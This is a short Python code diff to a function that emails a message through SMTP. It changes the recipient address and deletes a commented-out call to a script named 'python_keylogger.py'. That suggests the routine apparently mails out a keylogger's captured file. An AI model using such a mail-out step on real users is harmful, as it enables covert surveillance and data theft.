@@ -34,11 +34,10 @@ def dsendmail():
 	print(message)
 
 	# sending the mail
-	s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
+	s.sendmail("uor.27016005@gmail.com", "BR016005@student.reading.ac.uk", message)
 
 	# terminating the session
 	s.quit()
-	# os.system('python_keylogger.py')
 	f.close()
 
 
